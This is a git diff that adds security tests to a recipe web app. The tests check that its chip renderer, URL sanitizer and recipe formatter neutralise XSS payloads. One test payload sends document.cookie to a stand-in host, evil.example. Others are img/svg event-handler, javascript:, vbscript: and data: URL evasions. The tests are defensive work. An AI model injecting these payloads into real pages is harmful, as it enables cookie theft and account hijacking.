@@ -7,7 +7,7 @@ import assert from 'node:assert';
 import http from 'node:http';
 import app from '../server/index.js';
 import { safeGet, safeSet, normalizeFavoriteRecord } from '../src/services/storageService.js';
-import { sanitizeHtml, sanitizeTextInput } from '../src/utils/securitySanitizer.js';
+import { sanitizeHtml, sanitizeTextInput, sanitizeUrl } from '../src/utils/securitySanitizer.js';
 
 let server;
 let baseUrl;
@@ -145,4 +145,50 @@ test('SEC-11: Client storage normalization replaces hostile prototype properties
   assert.strictEqual(typeof normalized.id, 'string');
   assert.strictEqual(normalized.thumbnail, '', 'Dangerous javascript: URL must be blanked');
   assert(!normalized.instructions.includes('\x00'), 'Null byte must be stripped');
+});
+
+test('SEC-12: Pantry chip renderer escapes stored user input before HTML insertion', async () => {
+  const { buildPantryChipsHtml } = await import('../src/components/PantryFinder.js');
+  const hostileItems = [
+    '<img src=x onerror="alert(\'pantry-XSS\')">',
+    '"><script>document.location="https://evil.example/"+document.cookie</script>'
+  ];
+  const html = buildPantryChipsHtml(hostileItems);
+  assert(!html.includes('<img src=x'), 'Raw img injection must not survive');
+  assert(!html.includes('<script>'), 'Raw script tag must not survive');
+  assert(html.includes('&lt;script&gt;'), 'Script tag must be entity escaped in chip markup');
+  // data-remove attribute must be URL-encoded so removal still works
+  assert(html.includes('data-remove='), 'Removal hook must remain present');
+});
+
+test('SEC-13: sanitizeUrl blocks data:, vbscript: and protocol-relative evasion URLs', () => {
+  const evasions = [
+    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+    'vbscript:msgbox("x")',
+    'JaVaScRiPt:alert(1)',
+    ' javascript:alert(1)'
+  ];
+  for (const url of evasions) {
+    assert.strictEqual(sanitizeUrl(url, '#'), '#', `Must block: ${url}`);
+  }
+  assert.strictEqual(sanitizeUrl('https://www.themealdb.com/images/x.jpg', '#'), 'https://www.themealdb.com/images/x.jpg');
+});
+
+test('SEC-14: formatRecipe neutralizes hostile API payload fields end-to-end', async () => {
+  const { formatRecipe } = await import('../src/services/mealDbApi.js');
+  const hostileMeal = {
+    idMeal: '52772"><script>alert(1)</script>',
+    strMeal: 'Evil <img src=x onerror=alert(1)> Dish',
+    strCategory: 'Dessert<script>',
+    strArea: 'International<img src=x>',
+    strInstructions: 'Step 1 <script>alert(1)</script>',
+    strMealThumb: 'javascript:alert(1)',
+    strIngredient1: '<svg onload=alert(1)>',
+    strMeasure1: '"><script>alert(1)</script>'
+  };
+  const safe = formatRecipe(hostileMeal);
+  assert(!safe.title.includes('<img'), 'Title tags must be escaped');
+  assert(!safe.category.includes('<script>'), 'Category script must be escaped');
+  assert.strictEqual(safe.thumbnail, '', 'Hostile thumbnail URL must be blanked');
+  assert(!safe.ingredients[0].name.includes('<svg'), 'Ingredient name must be escaped');
 });
